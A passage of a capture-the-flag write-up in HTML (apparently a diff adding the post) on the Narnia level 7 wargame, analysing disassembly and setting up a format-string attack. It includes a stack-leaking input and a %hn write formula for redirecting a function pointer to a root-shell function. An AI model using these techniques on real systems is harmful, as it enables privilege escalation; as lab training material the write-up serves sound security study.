+ <span class="m">804873</span><span class="n">b</span><span class="o">:</span> <span class="n">e8</span> <span class="m">20</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048460</span> <span class="o">&lt;</span><span class="n">fflush</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048740</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">8048743</span><span class="o">:</span> <span class="n">e8</span> <span class="m">38</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048480</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048748</span><span class="o">:</span> <span class="m">89</span> <span class="n">c3</span>                <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
+ <span class="m">804874</span><span class="n">a</span><span class="o">:</span> <span class="n">e8</span> <span class="m">31</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048480</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804874</span><span class="n">f</span><span class="o">:</span> <span class="m">53</span>                   <span class="n">push</span>   <span class="n">ebx</span>
+ <span class="m">8048750</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">8048751</span><span class="o">:</span> <span class="n">e8</span> <span class="m">6</span><span class="n">a</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">c0</span> <span class="o">&lt;</span><span class="n">setreuid</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048756</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+ <span class="m">8048759</span><span class="o">:</span> <span class="m">68</span> <span class="n">cb</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x80488cb</span>
+ <span class="m">804875</span><span class="n">e</span><span class="o">:</span> <span class="n">e8</span> <span class="m">3</span><span class="n">d</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">a0</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048763</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">8048766</span><span class="o">:</span> <span class="n">b8</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+ <span class="m">804876</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">5</span><span class="n">d</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span>
+ <span class="m">804876</span><span class="n">e</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">804876</span><span class="n">f</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Once again there&rsquo;s not a ton of interesting things going on in the hacked function, but it&rsquo;s clear that if we are able to get it called, it will escalate our permissions and make a call to <code>system</code>, giving a shell. Since <code>goodfunction</code> and <code>hackedfunction</code> aren&rsquo;t that interesting that just leaves a deep dive into <code>vuln()</code>. Time to break it apart and see what can be done to break it and have it do whatever is needed to complete this challenge:</p>
+<h3 id="vuln">vuln()</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia7</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">d</span> <span class="n">narnia7</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="bp">F</span><span class="s">&#34;\n&#34;</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s">&#34;\n\n&#34;</span> <span class="s">&#39;$1 ~ /vuln/&#39;</span>
+<span class="m">0804861</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">&gt;:</span>
+ <span class="m">804861</span><span class="n">b</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="n">ebp</span>
+ <span class="m">804861</span><span class="n">c</span><span class="o">:</span> <span class="m">89</span> <span class="n">e5</span>                <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+ <span class="m">804861</span><span class="n">e</span><span class="o">:</span> <span class="m">81</span> <span class="n">ec</span> <span class="m">84</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x84</span>
+ <span class="m">8048624</span><span class="o">:</span> <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">push</span>   <span class="mh">0x80</span>
+ <span class="m">8048629</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">00</span>                <span class="n">push</span>   <span class="mh">0x0</span>
+ <span class="m">804862</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="m">80</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x80]</span>
+ <span class="m">804862</span><span class="n">e</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">804862</span><span class="n">f</span><span class="o">:</span> <span class="n">e8</span> <span class="n">bc</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">f0</span> <span class="o">&lt;</span><span class="n">memset</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048634</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">0</span><span class="n">c</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+ <span class="m">8048637</span><span class="o">:</span> <span class="m">68</span> <span class="n">ff</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x80486ff</span>
+ <span class="m">804863</span><span class="n">c</span><span class="o">:</span> <span class="m">68</span> <span class="n">f0</span> <span class="m">87</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x80487f0</span>
+ <span class="m">8048641</span><span class="o">:</span> <span class="n">e8</span> <span class="m">0</span><span class="n">a</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048646</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+ <span class="m">8048649</span><span class="o">:</span> <span class="m">68</span> <span class="m">24</span> <span class="m">87</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048724</span>
+ <span class="m">804864</span><span class="n">e</span><span class="o">:</span> <span class="m">68</span> <span class="m">05</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048805</span>
+ <span class="m">8048653</span><span class="o">:</span> <span class="n">e8</span> <span class="n">f8</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048658</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+ <span class="m">804865</span><span class="n">b</span><span class="o">:</span> <span class="n">c7</span> <span class="m">85</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span><span class="p">,</span><span class="mh">0x80486ff</span>
+ <span class="m">8048662</span><span class="o">:</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>
+ <span class="m">8048665</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">85</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span>
+ <span class="m">804866</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">95</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>    <span class="n">lea</span>    <span class="n">edx</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span>
+ <span class="m">8048671</span><span class="o">:</span> <span class="m">52</span>                   <span class="n">push</span>   <span class="n">edx</span>
+ <span class="m">8048672</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">8048673</span><span class="o">:</span> <span class="m">68</span> <span class="m">1</span><span class="n">d</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x804881d</span>
+ <span class="m">8048678</span><span class="o">:</span> <span class="n">e8</span> <span class="n">d3</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804867</span><span class="n">d</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">0</span><span class="n">c</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+ <span class="m">8048680</span><span class="o">:</span> <span class="m">68</span> <span class="m">38</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048838</span>
+ <span class="m">8048685</span><span class="o">:</span> <span class="n">e8</span> <span class="m">06</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048490</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804868</span><span class="n">a</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">804868</span><span class="n">d</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">02</span>                <span class="n">push</span>   <span class="mh">0x2</span>
+ <span class="m">804868</span><span class="n">f</span><span class="o">:</span> <span class="n">e8</span> <span class="n">dc</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048470</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048694</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">8048697</span><span class="o">:</span> <span class="n">c7</span> <span class="m">85</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span><span class="p">,</span><span class="mh">0x80486ff</span>
+ <span class="m">804869</span><span class="n">e</span><span class="o">:</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>
+ <span class="m">80486</span><span class="n">a1</span><span class="o">:</span> <span class="n">ff</span> <span class="m">75</span> <span class="m">08</span>             <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span>
+ <span class="m">80486</span><span class="n">a4</span><span class="o">:</span> <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">push</span>   <span class="mh">0x80</span>
+ <span class="m">80486</span><span class="n">a9</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="m">80</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x80]</span>
+ <span class="m">80486</span><span class="n">ac</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">ad</span><span class="o">:</span> <span class="n">e8</span> <span class="m">4</span><span class="n">e</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048500</span> <span class="o">&lt;</span><span class="n">snprintf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80486</span><span class="n">b2</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">0</span><span class="n">c</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+ <span class="m">80486</span><span class="n">b5</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">85</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span>
+ <span class="m">80486</span><span class="n">bb</span><span class="o">:</span> <span class="n">ff</span> <span class="n">d0</span>                <span class="n">call</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">bd</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">80486</span><span class="n">be</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>First up reserve <code>0x84</code> (132 bytes) on the stack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">     <span class="m">804861</span><span class="n">e</span><span class="o">:</span> <span class="m">81</span> <span class="n">ec</span> <span class="m">84</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x84</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Immediately after the reservation there&rsquo;s a <code>memset</code> called with <code>0x80</code> (128 bytes). So we have an unknown 4 bytes and how they are used.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048624</span><span class="o">:</span> <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">push</span>   <span class="mh">0x80</span>
+ <span class="m">8048629</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">00</span>                <span class="n">push</span>   <span class="mh">0x0</span>
+ <span class="m">804862</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="m">80</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x80]</span>
+ <span class="m">804862</span><span class="n">e</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">804862</span><span class="n">f</span><span class="o">:</span> <span class="n">e8</span> <span class="n">bc</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">f0</span> <span class="o">&lt;</span><span class="n">memset</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Print out the first message about the good function with it&rsquo;s address, then print out the second message about the hacked function with it&rsquo;s address:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048637</span><span class="o">:</span> <span class="m">68</span> <span class="n">ff</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x80486ff</span>
+ <span class="m">804863</span><span class="n">c</span><span class="o">:</span> <span class="m">68</span> <span class="n">f0</span> <span class="m">87</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x80487f0</span>
+ <span class="m">8048641</span><span class="o">:</span> <span class="n">e8</span> <span class="m">0</span><span class="n">a</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048649</span><span class="o">:</span> <span class="m">68</span> <span class="m">24</span> <span class="m">87</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048724</span>
+ <span class="m">804864</span><span class="n">e</span><span class="o">:</span> <span class="m">68</span> <span class="m">05</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048805</span>
+ <span class="m">8048653</span><span class="o">:</span> <span class="n">e8</span> <span class="n">f8</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This is where and how the unknown four bytes are used:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804865</span><span class="n">b</span><span class="o">:</span> <span class="n">c7</span> <span class="m">85</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span><span class="p">,</span><span class="mh">0x80486ff</span>
+ <span class="m">8048662</span><span class="o">:</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>What&rsquo;s happening is that the address of the <code>goodfunction</code> is stored at the address of <code>[ebp-0x84]</code>, acting as a function pointer on the stack. With that in mind, it makes sense that the next print is <code>&quot;ptrf() = [address]&quot;</code>. Followed by the explanation of what needs to be done, and finished off with a 2 second sleep:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804866</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">95</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>    <span class="n">lea</span>    <span class="n">edx</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span>
+ <span class="m">8048671</span><span class="o">:</span> <span class="m">52</span>                   <span class="n">push</span>   <span class="n">edx</span>
+ <span class="m">8048672</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">8048673</span><span class="o">:</span> <span class="m">68</span> <span class="m">1</span><span class="n">d</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x804881d</span>
+ <span class="m">8048678</span><span class="o">:</span> <span class="n">e8</span> <span class="n">d3</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048680</span><span class="o">:</span> <span class="m">68</span> <span class="m">38</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048838</span>
+ <span class="m">8048685</span><span class="o">:</span> <span class="n">e8</span> <span class="m">06</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048490</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804868</span><span class="n">d</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">02</span>                <span class="n">push</span>   <span class="mh">0x2</span>
+ <span class="m">804868</span><span class="n">f</span><span class="o">:</span> <span class="n">e8</span> <span class="n">dc</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048470</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now for the interesting parts, there&rsquo;s an <code>snprintf</code> that uses the buffer on the stack, followed by a fixed size of 128 bytes and the address that was passed in with the call to <code>vuln()</code>, aka <code>argv[1]</code>. After that a call is made with the contents of <code>[ebp-0x84]</code>, which is currently to the <code>goodfunction</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80486</span><span class="n">a1</span><span class="o">:</span> <span class="n">ff</span> <span class="m">75</span> <span class="m">08</span>             <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span>      <span class="c1"># argv[1]</span>
+ <span class="m">80486</span><span class="n">a4</span><span class="o">:</span> <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">push</span>   <span class="mh">0x80</span>                     <span class="c1"># Size</span>
+ <span class="m">80486</span><span class="n">a9</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="m">80</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x80]</span>           <span class="c1"># address of buffer</span>
+ <span class="m">80486</span><span class="n">ac</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">ad</span><span class="o">:</span> <span class="n">e8</span> <span class="m">4</span><span class="n">e</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048500</span> <span class="o">&lt;</span><span class="n">snprintf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>   <span class="c1"># snprintf(buffer, size, argv[1])</span>
+ <span class="m">80486</span><span class="n">b5</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">85</span> <span class="m">7</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x84]</span> <span class="c1"># get address of function pointer (currently goodfunction)</span>
+ <span class="m">80486</span><span class="n">bb</span><span class="o">:</span> <span class="n">ff</span> <span class="n">d0</span>                <span class="n">call</span>   <span class="n">eax</span>                      <span class="c1"># call function pointer</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This explains why a simple buffer overflow that no effect, the <code>snprintf</code> doesn’t allow for an overflow since it&rsquo;s bound to a size of <code>0x80</code>. However it doesn&rsquo;t look like any sanity or stripping was applied to <code>argv[1]</code> and it is provided as the last argument of <code>snprintf</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">snprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The goal here is to some how use the ability to leak information and write arbitrary bytes in order to change the address pointed to in <code>[ebp-0x84]</code> to something our choosing (aka <code>hackedfunction</code>). In other words, it&rsquo;s time for more Format String exploits. However, before we can get there we need to confirm that it is actually possible to leak information about the contents of the stack (and ultimately write whatever we want):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">./narnia7 <span class="k">$(</span>python -c <span class="s1">&#39;print &#34;%x.&#34;*256&#39;</span><span class="k">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Running that bit of input through does leak information, so the real magic begins. At the beginning of the article there was a magical formula referred to for generating a format string that will write a particular address to another - so that&rsquo;s what we&rsquo;re going to focus on using now. There are other ways to do this by writing one byte at a time, but who doesn&rsquo;t want to feel like a wizard every now and again?</p>
+<p>Before using the formula an explication of what&rsquo;s going on with it seems appropriate. Since we already know that HOB &lt; LOB we can use this version of the magic formula:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">[addr</span><span class="m">+2</span><span class="n">][addr]</span><span class="o">%.[HOB-8]x%</span><span class="n">[offset]</span><span class="o">$</span><span class="n">hn</span><span class="o">%.[LOB-HOB]x%</span><span class="n">[offset</span><span class="m">+1</span><span class="n">]</span><span class="o">$</span><span class="n">hn</span>
+</code></pre></td></tr></table>
+</div>
